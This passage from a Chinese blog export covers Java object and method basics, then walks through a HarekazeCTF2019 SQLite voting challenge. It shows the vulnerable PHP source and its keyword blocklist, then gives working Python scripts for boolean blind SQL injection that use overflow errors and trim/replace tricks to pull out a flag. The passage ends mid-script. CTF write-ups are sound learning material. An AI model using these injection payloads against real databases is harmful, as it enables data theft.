函数</p><p>创建类的对象：类的实例化 = 实例化类</p><h3 id="对象的创建与对象的内存解析"><a href="#对象的创建与对象的内存解析" class="headerlink" title="对象的创建与对象的内存解析"></a>对象的创建与对象的内存解析</h3><p>典型代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Person</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Person</span> p3 <span class="token operator">=</span> p1<span class="token punctuation">;</span>             <span class="token comment">//没有创建一个新的对象，与p1公用一个堆的对象实体。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="内存的解析"><a href="#内存的解析" class="headerlink" title="内存的解析"></a>内存的解析</h4><p>编译完源程序后，生成一个或多个字节码文件</p><p>我们使用JVM中的类的加载其和解释器对生成的字节码文件进行解释运行。意味着，需要将字节码文件对应的类加载到内存中，设计到内存解析<br>。即内存的解析出现在运行过程中。</p><h4 id="堆与栈"><a href="#堆与栈" class="headerlink" title="堆与栈"></a>堆与栈</h4><p>虚拟机栈，即为我们平时所说的栈结构。我们将局部变量储存在栈结构中。</p><p>堆，我们将new出的结构（比如数组、对象）加载在堆空间中。补充，对象的属性（非static）加载在堆空间中。</p><p>方法区：静态变量</p><h3 id="属性与局部变量"><a href="#属性与局部变量" class="headerlink" title="属性与局部变量"></a>属性与局部变量</h3><h4 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h4><ol><li>定义变量的格式: 数据类型 变量名 = 变量值</li><li>先声明后使用</li><li>变量都有其相应的作用域</li></ol><h4 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h4><ol><li><p>在类中声明的位置不同</p><p>属性:直接定义在类中的一对{}內<br>局部变量: 声明在方法內，方法形参、代码块内、构造器形参、构造器内部的参数</p></li><li><p>关于权限修饰符的不同</p><p>属性:可以在声明属性时:指明权限,使用权限修饰符<br>常使用的权限修饰符, privae, public, default,protected –&gt; 封装性</p><p>局部变量不可以</p></li><li><p>默认初始化值的使用</p><p>属性: 类的属性，根据类型，都有默认初始化值</p><pre><code>整型： 0浮点型： 0。0字符型： 0 &#39;\u0000&#39;引用数据类型: null布尔: false</code></pre><p>局部变量:</p><pre><code>没有默认初始化值，因此必须先初始化特别的，形参在调用时、我们赋值即可</code></pre></li><li><p>在内存中加载的位置不同</p><p>属性： 加载在堆空间（非static）</p><p>局部变量： 栈</p></li></ol><h3 id="变量分类的标准"><a href="#变量分类的标准" class="headerlink" title="变量分类的标准"></a>变量分类的标准</h3><ol><li>按照声明的类型</li></ol><p>  基本数据类型：</p><pre><code>数值型：整型（int，short，long）、浮点型（float，double）字符型（char）布尔型（boolen）</code></pre><p>  引用数据类型</p><pre><code>类（class）：字符串也是接口（interface）数组（[]）</code></pre><ol start="2"><li>按照声明的位置</li></ol><p>  成员变量：</p><pre><code>实例参数（不以static修饰）类变量（以static修饰）</code></pre><p>  局部变量：</p><pre><code>形参（方法、构造器中定义的变量）方法局部变量（在方法內定义）代码块局部变量（在代码块中定义）</code></pre><h3 id="匿名对象"><a href="#匿名对象" class="headerlink" title="匿名对象"></a>匿名对象</h3><ol><li>理解：我们创建的对象没有显示的赋给一个变量名。几位匿名对象</li><li>特征：匿名对象只能调用一此</li><li>使用如下</li></ol><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class InstaceTest &#123;    public static void main(String[] args) &#123;        Phone p &#x3D; new Phone();        p.playgame();        &#x2F;&#x2F; 匿名对象        &#x2F;&#x2F; 每一次都会重新new，空间重新开辟        new Phone().sendEmail();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="万事万物皆对象"><a href="#万事万物皆对象" class="headerlink" title="万事万物皆对象"></a>万事万物皆对象</h3><p>简单的说我有很多对象（滑稽），我是个海王。</p><ol><li><p>在Java语言范畴中，我们都将功能、结构等封装到类中、通过类的实例化、来调用具体的功能结构</p></li><li><p>涉及到Java语言与前端HTML、后端数据库交互时，前后端的结构在Java层面交互时、都体现为类、对象。</p></li><li></li></ol><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><ol><li>方法的定义</li></ol><p>  方法: 描述类应该具有的功能<br>  比如:Math类,sqrt(),random()<br>   Scanner: nexInt()</p><ol start="2"><li><p>方法的声明: 权限修饰符 返回值类型 方法名(形参列表){方法体}</p></li><li><p>说明:</p></li><li><p>关于权限修饰符:<br>Java规定的4中权限修饰符:private、public、缺省、protected      –&gt; 封装性细说</p></li><li><p>返回值类型:  有返回 无返回值    1. 如果方法有返回值, 必须在方法声明时, 指定返回值的类型,。同时，在方法体中使用return关键字，返回指定的变量。<br>  如果方法没有返回值，使用void即可。通常，没有返回值的方法中，就没必要使用return，范式，如果使用可以用作方法的结束</p></li></ol><pre><code>2. 我们定义方法该不该有返回值？  (1) 题目要求：  (2) 看经验</code></pre><ol start="3"><li><p>方法名: 属于标识符，遵循标识符的规则和规范，”见名知意“；</p></li><li><p>形参列表：可以规定0个、1个、多个形参</p></li></ol><pre><code>1. 格式：数据类型1 形参1   2. 我们定义方法时，该不该定义形参？  （1）题目要求  （2）凭经验</code></pre><ol start="5"><li><p>方法体：方法功能的体现</p></li><li><p>return 的使用：</p><p>1.作用范围： 使用在方法体中</p><p>2.作用：（1）结束方法</p><pre><code>   （2）针对于有返回值类型那个的方法</code></pre><p>3.注意： 后面不能呢个有关键字</p></li><li><p>方法的使用中可以调用当前类的属性</p><pre><code>特殊的方法中调用方法，称为递归方法。方法中不可以定义方法。但可以调用</code></pre></li></ol><h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>在一个类中，允许存在一个以上的同名方法，只要他们的参数个数或者参数类型不同即可</p><p>总结：“两同一不同”：同一个类，相同的参数名</p><p>  参数列表不同：参数的个数不同，参数类型不同</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public class MethodArgs &#123;    public static void main(String[] args) &#123;        MethodArgs m &#x3D; new MethodArgs();        m.show(&quot;hello&quot;,&quot;world&quot;);    &#125;    public void show(int i)&#123;    &#125;    public void show(String s)&#123;    &#125;    public void  show (String...strs)&#123;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="如何判断是否重载"><a href="#如何判断是否重载" class="headerlink" title="如何判断是否重载"></a>如何判断是否重载</h4><p>严格按照定义。</p><p>即两同一不同</p><p>和方法权限修饰符，方法体，形参名，返回值类型无关</p><h4 id="如何确定某一个方法的调用"><a href="#如何确定某一个方法的调用" class="headerlink" title="如何确定某一个方法的调用"></a>如何确定某一个方法的调用</h4><p>方法名==》参数列表</p><h4 id="可变形参的使用"><a href="#可变形参的使用" class="headerlink" title="可变形参的使用"></a>可变形参的使用</h4><p>具体的使用：</p><p>其实可以等价为数组。</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Test t &#x3D; new Test();t.method(new String[]&#123;&quot;aa&quot;,&quot;bb&quot;&#125;)class Test&#123;public void method(String ... strs)&#123;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="递归方法"><a href="#递归方法" class="headerlink" title="递归方法"></a>递归方法</h3><p>方法调用自己的一种形式</p><h2 id="Java值传递机制"><a href="#Java值传递机制" class="headerlink" title="Java值传递机制"></a>Java值传递机制</h2><h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>如果变量是基本数据类型，此时赋值的是变量所保存的数据值</p><p>如果变量是引用数据类型，此时赋值的是变量所保存的数据地址值</p><h3 id="方法中参数的概念"><a href="#方法中参数的概念" class="headerlink" title="方法中参数的概念"></a>方法中参数的概念</h3><p>形参，方法定义时：声明的小括号内的参数</p><p>实参：方法调用时，实际传递给形参的值</p><h3 id="Java中参数传递机制：值传递"><a href="#Java中参数传递机制：值传递" class="headerlink" title="Java中参数传递机制：值传递"></a>Java中参数传递机制：值传递</h3><p>如果参数时基本数据类型，此时实参传递给形参的为实参真实储存的数据值。</p><p>如果参数是引用数据类型，此时实参赋给形参的是实参存储数据的地址值。</p><p>String的值传递很特殊。为啥我当时没想，String既然为引用数据类型，为什么没有使用new</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019Sqlite Voting</title>
      <link href="/2021/09/24/harekazectf2019-sqlite-voting/"/>
      <url>/2021/09/24/harekazectf2019-sqlite-voting/</url>
      
        <content type="html"><![CDATA[<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>进入页面后为一个投票页面，发现可以直接查看源码和数据库的建立信息</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment">// dangerous chars</span>    <span class="token comment">// " % ' * + / &lt; = > \ _ ` ~ -</span>    <span class="token string double-quoted-string">"[\"%'*+\\/&lt;=>\\\\_`~-]"</span><span class="token punctuation">,</span>    <span class="token comment">// whitespace chars</span>    <span class="token string single-quoted-string">'\s'</span><span class="token punctuation">,</span>    <span class="token comment">// dangerous functions</span>    <span class="token string single-quoted-string">'blob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'load_extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'char'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unicode'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'(in|sub)str'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'[lr]trim'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'like'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'glob'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'match'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'in'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'limit'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'order'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'join'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/json; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// check user input</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'You must specify vote id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Vote id contains dangerous chars'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// update database</span><span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sqlite:../db/vote.db'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'An error occurred while updating database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// succeeded!</span><span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span>  <span class="token string single-quoted-string">'message'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'Thank you for your vote! The result will be published after the CTF finished.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以很明显的发现，这里不可以使用报错注入，和联合注入。但是他会根据返回信息来进行输出不同的语句。我们很明显可以使用布尔盲注。</p><p>但是注意他的过滤，我们可以看到比较运算符、空格、substr、char、引号，被过滤了，空格可以用()代替，substr可以用mid代替（如果比较运算符可以使用的话，完全可以用），总体来说比较运算符被ban了比较伤。</p><pre class="line-numbers language-none"><code class="language-none">&quot; % &#39; * + &#x2F; &lt; &#x3D; &gt; \ _ &#96; ~ - &#39;blob&#39;, &#39;load_extension&#39;, &#39;char&#39;, &#39;unicode&#39;,    &#39;(in|sub)str&#39;, &#39;[lr]trim&#39;, &#39;like&#39;, &#39;glob&#39;, &#39;match&#39;, &#39;regexp&#39;,    &#39;in&#39;, &#39;limit&#39;, &#39;order&#39;, &#39;union&#39;, &#39;join&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DROP TABLE IF EXISTS &#96;vote&#96;;  CREATE TABLE &#96;vote&#96; (    &#96;id&#96; INTEGER PRIMARY KEY AUTOINCREMENT,    &#96;name&#96; TEXT NOT NULL,    &#96;count&#96; INTEGER  );  INSERT INTO &#96;vote&#96; (&#96;name&#96;, &#96;count&#96;) VALUES    (&#39;dog&#39;, 0),    (&#39;cat&#39;, 0),    (&#39;zebra&#39;, 0),    (&#39;koala&#39;, 0);  DROP TABLE IF EXISTS &#96;flag&#96;;  CREATE TABLE &#96;flag&#96; (    &#96;flag&#96; TEXT NOT NULL  );  INSERT INTO &#96;flag&#96; VALUES (&#39;HarekazeCTF&#123;&lt;redacted&gt;&#125;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  我们可以从数据库中得知其表信息，我们所需要的就在flag表中。</p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>  我们必须想一下没有比较运算符该怎么进行比较，至于限制引号我们可以通过16进制转化来绕过，这样也用不着char。通过大佬的文章我了解了到了一种新的方式。</p><p>  我们可以通过长度来进行布尔盲注。首先，我们想办法获得flag的长度，然后借助replace(str1,str2,””)函数进行测试，我们通过不断按顺序猜测flag的字符，并添加到str2中，只要我们的str2正确，flag中的str2部分就会被替换，从而长度减少。我们达到了判断的目的。</p><h3 id="长度的判断"><a href="#长度的判断" class="headerlink" title="长度的判断"></a>长度的判断</h3>  <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://c809e594-d866-48fd-ade7-b67d3fc4bac4.node4.buuoj.cn:81/vote.php"</span>l <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 首先通过文章我们应该都了解了基本思想。这里对这payload进行讲解。</span>    <span class="token comment"># 我先吐槽一句自己，是真的蠢。</span>    <span class="token comment"># 首先，hex内部语句应该都明白。然后length就是获得flag的16进制的位数，我当时竟然在想，不是已经异或了吗，为啥还要用这个函数</span>    <span class="token comment"># ，真的好蠢。length获得后一1&lt;&lt;n进行异或，来获得各个位的具体情况即1还是0，然后case when 其实就是if else，如果为0 返回0</span>    <span class="token comment"># 为1则返回整数溢出值。从而使返回结果不同</span>    payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment"># select abs(case(length(hex((select(flag)from(flag))))&amp;1)when(0)then(0)else(0x8000000000000000)end) from flag</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'id'</span> <span class="token punctuation">:</span> payload    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token comment"># 这里就是或操作来获得具体的位数。现在的问题是</span>        l <span class="token operator">=</span> l<span class="token operator">|</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们通过length函数获得flag的长度，将其16进制化，并不断通过<strong>与</strong>运算获得每一个位的情况，即0还是1，然后用或<strong>或</strong>运算进行连接，由此获得长度。这里也运用了布尔盲注</p><h3 id="获得具体的值"><a href="#获得具体的值" class="headerlink" title="获得具体的值"></a>获得具体的值</h3><p>这里很巧妙的代替了字符，以保证连接时不出现引号。</p><p>核心为trim，将某个字符串两边的特定字符去除，与mysql不同的是，sqlite貌似trim是循环的，会将去除字符一个个的从被去除去除掉。</p><p>像这里A的取法就是例子，而mysql可以用这样的方式代替。其他的同理。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT TRIM(65627261 FROM TRIM(7 FROM HEX(&#39;zebra&#39;)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># hex(b'zebra') = 7A65627261</span>  <span class="token comment"># 除去 12567 就是 A ，其余同理</span>  A <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span>  C <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span>  D <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span>  E <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span>  F <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>  <span class="token comment"># hex(b'koala') = 6B6F616C61</span>  <span class="token comment"># 除去 16CF 就是 B</span>  B <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>C<span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>F<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后我们便可以通过replace来获得flag了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">import</span> requestsURL <span class="token operator">=</span> <span class="token string">'http://5f6e4915-1409-48a4-96c4-80cf52aa13a6.node4.buuoj.cn:81/vote.php'</span>l <span class="token operator">=</span> <span class="token number">0</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(length(hex((select(flag)from(flag))))&amp;</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">)when(0)then(0)else(0x8000000000000000)end)'</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>    l <span class="token operator">|</span><span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> j<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] length:'</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span>table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>table<span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span><span class="token comment"># trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)</span>table<span class="token punctuation">[</span><span class="token string">'C'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(typeof(.1)),12567)'</span><span class="token comment"># trim(hex(typeof(.1)),12567)</span>table<span class="token punctuation">[</span><span class="token string">'D'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0xffffffffffffffff),123)'</span>table<span class="token punctuation">[</span><span class="token string">'E'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex(0.1),1230)'</span>table<span class="token punctuation">[</span><span class="token string">'F'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span>table<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">||</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span>res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span><span class="token string">b'flag&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'0123456789ABCDEF'</span><span class="token punctuation">:</span>    <span class="token comment"># 666C61677B</span>    <span class="token comment"># c在res+x循环，然后如果c为数字，则返回c，如果不在则代替。</span>    t <span class="token operator">=</span> <span class="token string">'||'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>c <span class="token keyword">if</span> c <span class="token keyword">in</span> <span class="token string">'0123456789'</span> <span class="token keyword">else</span> table<span class="token punctuation">[</span>c<span class="token punctuation">]</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> res <span class="token operator">+</span> x<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>URL<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span>      <span class="token comment"># 这里使用了两个length进行判断，很巧妙，先替代，如果替代成功则length不为84，那么再次使用replace时不会被替代</span>      <span class="token string">'id'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>t<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0))),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>l<span class="token punctuation">&#125;</span></span><span class="token string">,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">b'An error occurred'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>content<span class="token punctuation">:</span>      res <span class="token operator">+=</span> x      <span class="token keyword">break</span>  <span class="token keyword">print</span><span class="token 